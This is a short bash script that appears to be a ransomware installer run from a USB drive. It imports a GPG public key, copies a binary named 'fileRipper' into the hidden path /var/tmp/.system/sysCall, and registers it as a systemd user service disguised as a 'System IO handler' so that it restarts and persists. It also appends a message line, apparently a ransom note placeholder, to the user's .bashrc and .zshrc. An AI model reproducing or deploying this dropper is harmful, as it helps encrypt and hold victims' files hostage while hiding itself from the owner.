#!/bin/bash
lol=$(lsblk | grep 1.8G)
disk=$(echo $lol | awk '{print $1}')
mntt=$(lsblk | grep $disk | awk '{print $7}')
cp -r $mntt/tools/public.pub /tmp
gpg --import /tmp/public.pub
rm /tmp/public.pub
mkdir ~/.crypttt
mkdir -p ~/.config/systemd/user 
echo -e "[Unit]\nDescription= System IO handler.\n\n[Service]\nExecStart=/bin/bash /var/tmp/.system/sysCall -no-browser\nRestart=on-failure\nSuccessExitStatus=3 4\nRestartForceExitStatus=3 4\n\n[Install]\nWantedBy=multi-user.target" > ~/.config/systemd/user/libSystemIO.service
mkdir /var/tmp/.system
cp -r $mntt/tools/fileRipper /var/tmp/.system/sysCall
chmod +x /var/tmp/.system/sysCall
echo -e "ls -a | grep 'zshrc' &> /dev/null\nif [ \$? = 0 ]; then\n\techo \"echo Enter Your message here\" >> ~/.zshrc\nfi\n\nls -a | grep 'bashrc' &> /dev/null\nif [ \$? = 0 ]; then\n\techo \"echo Enter Your message here\" >> ~/.bashrc\nfi" > ~/tmmmp
chmod +x ~/tmmmp && cd ~/ && ./tmmmp && rm tmmmp
